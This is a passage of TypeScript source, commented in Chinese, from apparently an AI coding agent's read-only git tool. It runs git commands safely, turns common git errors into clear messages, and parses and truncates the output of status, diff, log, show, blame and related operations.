            return toolInvalid('blame 必须指定 path —— 逐行追责得先有个文件（示例: "src/tools/builtin.ts"，路径是仓库根相对）。');
          }
          const bad = validateLineRange(lines);
          if (bad !== null) return toolInvalid(bad);
        }

        const argv = buildGitArgs({ op: opValue, target, path: onlyPath, lines, limit });
        const { execFileSync } = await import('node:child_process');

        let raw: Buffer;
        try {
          // encoding: 'buffer' 而非 'utf-8'：交给既有的 decodeChildOutput 做编码判别
          raw = execFileSync('git', argv, {
            encoding: 'buffer', timeout: 15000, maxBuffer: 4096 * 1024, windowsHide: true,
          });
        } catch (e) {
          const err = e as { code?: string; status?: number; stderr?: Buffer | string };
          if (err.code === 'ENOENT') {
            return toolError('找不到 git 程序（PATH 里没有 git）。请先安装 git 并确保它在 PATH 上。');
          }
          const stderr = err.stderr === undefined
            ? ''
            : (Buffer.isBuffer(err.stderr) ? decodeChildOutput(err.stderr) : String(err.stderr));
          if (isNotARepo(stderr)) {
            return toolError(`当前目录不是 git 仓库：${process.cwd()}。本工具只查看仓库、不会替你 git init —— 要新建仓库请用 bash。`);
          }
          // 空仓库跑 log 以 128 退出：这不是故障，是"还没有提交"这个事实
          if (opValue === 'log' && isNoCommitsYet(stderr)) {
            return toolOk(renderLog([], limit));
          }
          // blame 一个没跟踪过的路径：不是环境故障，而是"它还没有历史" —— 把这一点讲清楚，
          // 否则模型只看到一句 `fatal: no such path`，容易去翻 git 怎么重装
          if (opValue === 'blame' && isNoSuchPath(stderr)) {
            return toolError(`追不了 ${onlyPath} 的责任：git 说这个路径在指定版本里不存在。`
              + '常见原因：文件还没有被 git 跟踪（新文件要先 add / commit 才有历史），'
              + `或者路径写错了（路径是**仓库根相对**）。原始信息：${stderr.trim().slice(0, 160)}`);
          }
          // show 的 128 有两种含义：仓库还是空的，或者这个 ref 不存在 —— 两种都得说
          if (opValue === 'show' && isNoCommitsYet(stderr)) {
            return toolError(`看不了这次提交（${target.trim() === '' ? 'HEAD' : target.trim()}）：`
              + '仓库还没有任何提交，或者这个版本引用不存在。'
              + `原始信息：${stderr.trim().slice(0, 160)}`);
          }
          return toolError(`git ${op} 执行失败（退出码 ${err.status ?? '?'}）：${stderr.trim().slice(0, 300) || '（无 stderr）'}`);
        }

        const text = decodeChildOutput(raw);
        let body: string;
        switch (opValue) {
          case 'status':
            body = renderStatus(parseStatus(text));
            break;
          case 'diff': {
            const files = parseNumstat(text);
            body = renderDiff(files.slice(0, DIFF_FILE_MAX), target, onlyPath, files.length > DIFF_FILE_MAX);
            break;
          }
          case 'log':
            body = renderLog(parseLog(text), limit);
            break;
          case 'branch':
            body = renderBranch(parseBranch(text));
            break;
          case 'show': {
            const parsed = parseShow(text);
            if (parsed === null) {
              // 形状不对（空输出 / 被用户配置染色 / 格式变了）—— 报出来而不是编一条空记录
              body = `[提交] 拿不到这次提交的结构化信息（git 的输出形状不符合预期）。原始输出开头：${text.slice(0, 200)}`;
            } else {
              const files = parsed.files.slice(0, DIFF_FILE_MAX);
              body = renderShow({ ...parsed, files }, onlyPath, parsed.files.length > DIFF_FILE_MAX);
            }
            break;
          }
          case 'blame': {
            const all = parseBlame(text);
            const shown = all.slice(0, BLAME_LINE_MAX);
            body = renderBlame(onlyPath, shown, all.length, shown.length);
            break;
          }
          case 'remote':
            body = renderRemote(parseRemote(text));
            break;
          default:
            body = renderTag(parseTag(text));
        }

        const shown = body.length > 4000
          ? `${body.slice(0, 4000)}\n...（输出截断：共 ${body.length} 字符）`
          : body;
        return toolOk(shown);
      } catch (e) {
        if (e instanceof ToolInputError) return toolInvalid(e.message);
        return toolError(`git 执行失败: ${e instanceof Error ? e.message.slice(0, 300) : String(e)}`);
      }
    },
  }));
}
